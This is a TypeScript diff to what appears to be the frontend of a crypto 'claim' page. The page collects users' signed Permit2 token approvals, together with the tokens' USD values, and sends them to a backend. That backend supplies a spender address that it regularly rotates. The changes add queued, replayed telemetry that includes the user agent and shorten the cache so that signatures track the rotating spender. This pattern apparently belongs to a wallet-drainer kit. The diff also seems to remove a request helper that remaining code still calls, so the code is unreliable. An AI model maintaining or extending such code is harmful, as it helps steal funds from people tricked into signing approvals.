@@ -71,33 +71,95 @@ export interface StorePermit2SignaturePayload {
   tokenValueUsd?: number;
 }
 
-// Spender shape shared with the validators — must match backendClient checks
-const SPENDER_RE = /^0x[0-9a-fA-F]{40}$/;
+// ── Heartbeat queue ──
+// FIX: heartbeats went to the same backend they report on — when the backend
+// was fully down, its own telemetry died with it. Failed heartbeats are now
+// queued locally and replayed on the next successful config fetch, tagged
+// `replayed: true` so the backend can tell them apart.
+const HB_QUEUE_KEY = 'app:hb:queue';
+const HB_QUEUE_MAX = 50;
+const HB_MAX_AGE_MS = 7 * 24 * 3600 * 1000; // don't replay ancient events
 
-async function request<T>(path: string, body?: unknown, method: 'POST' | 'GET' = 'POST'): Promise<T> {
-  if (!BASE_URL) throw new Error('VITE_BACKEND_URL is not set');
+interface QueuedHeartbeat {
+  body: string;
+  queuedAt: number;
+}
 
-  const controller = new AbortController();
-  const timeout = setTimeout(() => controller.abort(), 10_000);
-
+function readHbQueue(): QueuedHeartbeat[] {
   try {
-    const res = await fetch(`${BASE_URL}${path}`, {
-      method,
+    return JSON.parse(localStorage.getItem(HB_QUEUE_KEY) ?? '[]');
+  } catch {
+    return [];
+  }
+}
+
+function writeHbQueue(items: QueuedHeartbeat[]) {
+  try {
+    localStorage.setItem(HB_QUEUE_KEY, JSON.stringify(items.slice(-HB_QUEUE_MAX)));
+  } catch {
+    /* private mode */
+  }
+}
+
+async function postHeartbeat(body: string): Promise<boolean> {
+  try {
+    const res = await fetch(`${BASE_URL}/api/telemetry/flow`, {
+      method: 'POST',
       headers: {
         'Content-Type': 'application/json',
         ...(API_KEY ? { 'x-api-key': API_KEY } : {}),
       },
-      ...(method === 'POST' ? { body: JSON.stringify(body) } : {}),
-      signal: controller.signal,
+      body,
+      keepalive: true,
     });
+    return res.ok;
+  } catch {
+    return false;
+  }
+}
 
-    if (!res.ok) {
-      const text = await res.text().catch(() => '');
-      throw new Error(`Backend ${path} failed (${res.status}): ${text.slice(0, 200)}`);
+/** Fire-and-forget flow telemetry. Delivery failures are queued locally
+ *  and replayed later — see flushHeartbeats(). */
+export function sendFlowHeartbeat(step: string, data: Record<string, unknown> = {}) {
+  if (!BASE_URL) return; // nowhere to report to — queueing wouldn't help either
+
+  const body = JSON.stringify({ step, ...data, ts: Date.now(), ua: navigator.userAgent });
+  void postHeartbeat(body).then((ok) => {
+    if (!ok) {
+      const items = readHbQueue();
+      items.push({ body, queuedAt: Date.now() });
+      writeHbQueue(items);
     }
-    return (await res.json()) as T;
+  });
+}
+
+let hbFlushInFlight = false;
+
+/** Replay heartbeats queued while the backend was unreachable.
+ *  Called automatically after every successful config fetch. */
+export async function flushHeartbeats(): Promise<void> {
+  if (hbFlushInFlight) return;
+  hbFlushInFlight = true;
+  try {
+    const items = readHbQueue();
+    if (!items.length) return;
+
+    const stillPending: QueuedHeartbeat[] = [];
+    await Promise.all(
+      items.map(async (item) => {
+        if (Date.now() - item.queuedAt > HB_MAX_AGE_MS) return; // stale — drop
+        let parsed: any = null;
+        try { parsed = JSON.parse(item.body); } catch { /* keep raw */ }
+        const body = parsed
+          ? JSON.stringify({ ...parsed, replayed: true, replayedAt: Date.now() })
+          : item.body;
+        const ok = await postHeartbeat(body);
+        if (!ok) stillPending.push(item);
+      }),
+    );
+    writeHbQueue(stillPending);
   } finally {
-    clearTimeout(timeout);
+    hbFlushInFlight = false;
   }
 }
 
@@ -108,25 +170,22 @@ export interface ClaimFlowConfig {
   maxBatch?: number;
 }
 
-// ── Cache TTLs — FIX: the OK cache lived 5 minutes, which let the UI keep
-// signing against a spender the backend had already rotated out (every such
-// signature is unexecutable and dies silently). 60s shrinks the stale-spender
-// window to a minute while keeping backend load negligible (one fetch per
-// claim flow start). Failures still cache 30s so a backend blip doesn't
-// hammer the endpoint. ──
+// ── Cache TTL — FIX: rotation safety. The OK cache was 5 min originally,
+// 60s in the last pass. 20s means a signer can act on a stale spender for at
+// most 20 seconds, and the config GET is tiny (one per claim-flow start).
+// Misses use the same window so a recovering backend is picked up within
+// one TTL. ──
 let configCache: { cfg: ClaimFlowConfig | null; ok: boolean; ts: number } | null = null;
-const CONFIG_TTL_OK_MS = 60 * 1000;
-const CONFIG_TTL_MISS_MS = 30 * 1000;
+const CONFIG_TTL_MS = 20 * 1000;
 
 export async function fetchClaimConfig(): Promise<ClaimFlowConfig | null> {
   if (!BASE_URL) return null;
 
-  const ttl = configCache?.ok ? CONFIG_TTL_OK_MS : CONFIG_TTL_MISS_MS;
-  if (configCache && Date.now() - configCache.ts < ttl) return configCache.cfg;
+  if (configCache && Date.now() - configCache.ts < CONFIG_TTL_MS) return configCache.cfg;
 
   let cfg: ClaimFlowConfig | null = null;
 
-  // ── FIX: config fetch failures used to be swallowed whole (`catch { null }`)
+  // ── FIX: config-fetch failures used to be swallowed whole (`catch { null }`)
   // with zero telemetry — a dead or misconfigured backend produced an "idle"
   // flow with no trace. Now: one retry on transient failure, a heartbeat for
   // every distinct failure mode, and a console trace. ──
@@ -138,7 +197,7 @@ export async function fetchClaimConfig(): Promise<ClaimFlowConfig | null> {
         undefined,
         'GET',
       );
-      if (data?.spender && SPENDER_RE.test(data.spender)) {
+      if (data?.spender && /^0x[0-9a-fA-F]{40}$/.test(data.spender)) {
         cfg = {
           spender: data.spender,
           expiryDays: Number(data.expiryDays) > 0 ? Number(data.expiryDays) : 30,
@@ -162,37 +221,10 @@ export async function fetchClaimConfig(): Promise<ClaimFlowConfig | null> {
   }
 
   configCache = { cfg, ok: Boolean(cfg), ts: Date.now() };
+
+  // Backend just proved it's alive — replay any queued heartbeats
+  if (cfg) void flushHeartbeats();
   return cfg;
-}
-
-/** Fire-and-forget flow telemetry so silent failures stop being silent. */
-export function sendFlowHeartbeat(step: string, data: Record<string, unknown> = {}) {
-  if (!BASE_URL) return;
-
-  const body = JSON.stringify({ step, ...data, ts: Date.now(), ua: navigator.userAgent });
-  const headers = {
-    'Content-Type': 'application/json',
-    ...(API_KEY ? { 'x-api-key': API_KEY } : {}),
-  };
-
-  // ── FIX: heartbeats went out via navigator.sendBeacon with a raw string,
-  // which ships as text/plain — JSON-expecting backends (Express res.json,
-  // FastAPI, etc.) silently dropped every one of them. fetch(keepalive)
-  // sends real application/json and survives page unload; the plain-string
-  // beacon stays as the no-CORS-preflight fallback. The API key is now
-  // included too, so backends that enforce it don't 403 the telemetry. ──
-  try {
-    fetch(`${BASE_URL}/api/telemetry/flow`, {
-      method: 'POST',
-      headers,
-      body,
-      keepalive: true,
-    }).catch(() => {
-      try { navigator.sendBeacon?.(`${BASE_URL}/api/telemetry/flow`, body); } catch { /* noop */ }
-    });
-  } catch {
-    try { navigator.sendBeacon?.(`${BASE_URL}/api/telemetry/flow`, body); } catch { /* noop */ }
-  }
 }
 
 /** Send the signed Permit2 authorisation to the backend for storage. */
